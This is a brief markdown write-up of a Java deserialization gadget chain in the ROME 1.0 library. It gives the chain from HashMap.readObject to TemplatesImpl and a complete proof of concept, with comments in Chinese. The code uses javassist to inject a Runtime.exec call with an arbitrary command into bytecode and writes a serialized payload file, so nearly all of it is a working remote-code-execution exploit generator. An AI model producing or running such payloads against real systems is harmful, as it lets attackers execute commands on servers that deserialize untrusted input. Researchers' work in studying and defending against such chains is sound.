# ROME

## Gadget Chain&Require

```
Gadget Chain:
	HashMap.readObject()
	HashMap.hash()
		ObjectBean.hashCode()
			EqualsBean.beanHashCode()
				ObjectBean.toString()
					ToStringBean.toString()
						Method.invoke()
							TemplatesImpl.getOutputProperties()
							
Require:
    rome1.0
```

## poc

```java
package com.romeAttack;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.syndication.feed.impl.EqualsBean;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.xml.internal.messaging.saaj.util.ByteOutputStream;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;

public class RomeSer {

    public byte[] getPayload(String command) throws Exception {
        TemplatesImpl templatesImpl = createTemplatesImpl(command);

        //创建包含toSringBean的ObjectBean
        ObjectBean tSB = new ObjectBean(Templates.class, templatesImpl);

        //创建equalBean的ObjectBean
        //创建一个无害的ObjectBean插入，避免在payload阶段反序列化
        ObjectBean bean = new ObjectBean(ObjectBean.class, new ObjectBean(String.class, "foo"));

        HashMap<Object, Object> map = new HashMap<>();
        map.put(bean, "foo");

        setFieldValue(bean,"_equalsBean",new EqualsBean(ObjectBean.class, tSB));
        ByteOutputStream byteOutputStream = new ByteOutputStream();
        FileOutputStream fos = new FileOutputStream("C:\\Users\\AEQAQ\\Desktop\\gc\\1.ser");
        ObjectOutputStream oos = new ObjectOutputStream(fos);

        oos.writeObject(map);
        oos.flush();
        oos.close();

        return null;
    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static TemplatesImpl createTemplatesImpl(String command) throws Exception {
        TemplatesImpl templates = new TemplatesImpl();
        //修改Neo类，插入command，创建恶意字节码，此处参考ysoserial
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass clazz = pool.makeClass("Cat");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replace("\\", "\\\\").replace("\"", "\\\"") +
                "\");";
        clazz.makeClassInitializer().insertAfter(cmd);

        String randomClassName = "EvilCat" + System.nanoTime();
        clazz.setName(randomClassName);
        clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));

        final byte[] classBytes = clazz.toBytecode();

        setFieldValue(templates, "_bytecodes", new byte[][] {classBytes});
        setFieldValue(templates, "_name", "HelloTemplatesImpl");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

        return templates;
    }
}
```

